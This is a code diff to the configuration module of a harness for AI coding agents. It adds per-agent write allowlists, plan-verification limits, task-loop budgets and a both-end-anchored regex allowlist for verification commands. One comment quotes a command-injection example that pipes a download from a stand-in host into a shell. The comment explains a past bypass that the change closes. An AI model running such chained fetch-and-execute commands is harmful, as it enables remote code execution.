@@ -88,6 +88,96 @@ export const DEFAULTS = {
   // the hook payload as `agent_type`.
   readOnlyAgents: ['tester', 'auditor', 'change-auditor', 'Explore'],
 
+  agents: {
+    // Per-agent write allowlists, enforced by `guard-write.mjs`.
+    //
+    // SCOPING LIVES IN THE SCRIPT, NOT IN AGENT FRONTMATTER. Per-subagent `hooks:` blocks are
+    // documented as scoped to that subagent, and in the system this was extracted from they were
+    // schema-valid and DID NOT FIRE — a tester wrote to source unblocked while settings.json hooks
+    // fired normally in the same session. `agent_type` is on the payload, so the script can do the
+    // scoping itself and be sure it happened.
+    //
+    // An agent not listed here is unrestricted. This holds specific agents to their stated role; it is
+    // not a session lockdown.
+    write: {
+      architect: ['.claude/plans/**'],
+      tester: ['.claude/plans/**', 'tests/**', 'test/**', '**/*.test.*', '**/*.spec.*', '**/__tests__/**']
+    },
+
+    // A single Write to a plan document larger than this is refused, so the architect writes a skeleton
+    // and fills phases in with Edit.
+    //
+    // HONEST LIMIT: this cannot prevent the failure that motivated it. A generation that times out
+    // before emitting the tool call is never seen by a PreToolUse hook, and a Write is atomic — a
+    // timed-out one saves zero bytes, not a partial file. What it prevents is the monolithic write that
+    // SUCCEEDS, which is how the habit survives.
+    planWriteMaxLines: 600
+  },
+
+  plan: {
+    dir: '.claude/plans',
+
+    // Extra commands a step's `**Verify:**` line may execute, as both-end-anchored regex sources.
+    // Your declared `commands` are allowed automatically, along with a small fixed safe set
+    // (`test -f`, `grep`). See verify-plan.mjs for why the list is anchored at BOTH ends and why
+    // there is no shell.
+    allowedChecks: [],
+
+    // Commands that MAY be run but can never exit 0 in this project — a suite with known-failing
+    // tests, a check that trips on pre-existing drift. "May be executed" and "is a valid gate" are
+    // different claims, and conflating them produces a phase that can never complete and a run that
+    // halts naming work that was finished and correct.
+    unsatisfiable: [],
+
+    // Below this fraction of discriminating checks, `--strict` exits 2: the plan cannot tell you
+    // whether work was done. Distinct from exit 1 ("a step failed") on purpose.
+    strictThreshold: 0.5,
+
+    // Above this fraction of WEAK checks in a single phase, the cursor reports low-confidence rather
+    // than done. Per phase, not per plan: a strong plan carrying one all-grep phase averages out above
+    // any plan-wide threshold, and the cursor walks straight through the phase nobody checked.
+    weakPhaseThreshold: 0.66
+  },
+
+  lessons: {
+    enabled: true,
+    dir: '.claude/lessons',
+
+    // The cap is the point. Past ~40 the index stops being scannable and injection stops being cheap,
+    // so growth must be paid for by consolidating or pruning. Raising it is how a curated set becomes
+    // a log.
+    max: 40,
+    maxBodyLines: 25
+  },
+
+  candidates: {
+    enabled: true,
+
+    // Raw incidents captured automatically and NEVER injected into context, so they are free. At this
+    // count the selftest reports that a review is due.
+    reviewAt: 15
+  },
+
+  taskLoop: {
+    enabled: true,
+
+    // Every number here should come from a measurement in YOUR project, not from these defaults.
+    // Note what is absent: there is no token cap, because token usage is not reliably observable on
+    // the hook payload. A cap you cannot measure is decoration.
+    budget: { iterations: 8, runMs: 4 * 60 * 60 * 1000, iterationMs: 35 * 60 * 1000, spawns: 14 },
+
+    // Iterations against one phase with no new step passing before halting. Three, because the repair
+    // loop already gets three attempts at one failure — so a stuck phase has had nine chances.
+    phaseStuckAt: 3,
+
+    // The repair loop owns fixing a red tree; the driver is the backstop, so its ceiling is higher.
+    redCeiling: 4,
+
+    // Turns the driver waits for a plan to be bound before halting. A run with no plan has nothing for
+    // the cursor to read, and a driver that releases forever is indistinguishable from one working.
+    planlessCeiling: 3
+  },
+
   // Everything the harness writes at runtime. One directory so it is trivial to gitignore or wipe.
   state: { dir: '.claude/.harness' }
 }
@@ -227,6 +317,8 @@ export const load = (root = process.cwd()) => {
 
   config.evidencePatterns = buildEvidencePatterns(config, errors)
   config.statePaths = statePaths(config)
+  config.checkAllowlist = buildCheckAllowlist(config, errors)
+  config.unsatisfiableChecks = buildUnsatisfiable(config, errors)
 
   return config
 }
@@ -339,11 +431,83 @@ export const statePaths = config => {
     verifyState: `${dir}/verify-state.json`,
     claimState: `${dir}/claim-state.json`,
     loopState: `${dir}/loop-state.json`,
+    reviewState: `${dir}/review-state.json`,
     heartbeatLog: `${dir}/heartbeat.jsonl`,
     heartbeatView: `${dir}/heartbeat.json`,
     attempts: `${dir}/attempts`,
-    haltReport: `${dir}/halt-report.md`
+    haltReport: `${dir}/halt-report.md`,
+    lessonsState: `${dir}/lessons-state.json`,
+    lessonPromptState: `${dir}/lesson-prompt-state.json`,
+    candidates: `${dir}/candidates.jsonl`,
+    runs: `${dir}/runs`,
+    runPointer: `${dir}/runs/current.json`
   }
+}
+
+// ── The check allowlist ────────────────────────────────────────────────────────
+//
+// Which commands a plan step's `**Verify:**` line may execute. Generated rather than hand-listed:
+// your declared `commands`, plus anything in `plan.allowedChecks`, plus a small fixed safe set.
+//
+// Generating it from `commands` is the portable half of the original design, which hardcoded one
+// project's npm scripts. It also closes a hole by construction — a plan cannot ask for a command this
+// project never declared it runs.
+//
+// Anchored at BOTH ends, always. Start-anchoring alone means anything appended after an allowed prefix
+// rides along, which turned the checker into an execution vector in the system this came from:
+// `grep -q x y ; curl evil | sh` passed. (The real fix is that verify-plan uses no shell at all; this
+// is defence in depth, bounding WHICH programs may run.)
+export const BASE_ALLOWED_CHECKS = [
+  // Proves a deliverable exists. Honest, and the weakest thing worth allowing.
+  String.raw`test -[efd] [\w./-]+`,
+
+  // The last resort, not the workhorse. Quoted patterns allowed; the path may not wander.
+  String.raw`grep -[a-zA-Z]+ (?:"[^"]*"|'[^']*'|[\w.@/-]+) [\w./-]+`
+]
+
+export const buildCheckAllowlist = (config, errors = []) => {
+  const sources = []
+
+  for (const command of Object.values(config.commands ?? {})) {
+    // `(?: -- <args>)?` because most runners forward arguments that way, restricted to word characters
+    // so nothing can ride along.
+    if (command) sources.push(`${escapeLiteral(command)}(?: -- [\\w.@/-]+)?`)
+  }
+
+  sources.push(...(config.plan?.allowedChecks ?? []), ...BASE_ALLOWED_CHECKS)
+
+  const compiled = []
+
+  for (const source of sources) {
+    try {
+      compiled.push(new RegExp(`^${source}$`))
+    } catch (error) {
+      errors.push(`plan.allowedChecks entry is not a valid regex: ${source} — ${error.message}`)
+    }
+  }
+
+  return compiled
+}
+
+const escapeLiteral = value => String(value).trim().replace(/[.*+?^${}()|[\]\\]/g, '\\$&').replace(/\s+/g, String.raw`\s+`)
+
+export const buildUnsatisfiable = (config, errors = []) => {
+  const out = []
+
+  for (const entry of config.plan?.unsatisfiable ?? []) {
+    if (!entry?.match || !entry?.why) {
+      errors.push(`plan.unsatisfiable entry needs "match" and "why": ${JSON.stringify(entry)}`)
+      continue
+    }
+
+    try {
+      out.push({ re: new RegExp(`^${entry.match}$`), why: entry.why })
+    } catch (error) {
+      errors.push(`plan.unsatisfiable "${entry.match}" is not a valid regex: ${error.message}`)
+    }
+  }
+
+  return out
 }
 
 // ── Shared hook plumbing ───────────────────────────────────────────────────────
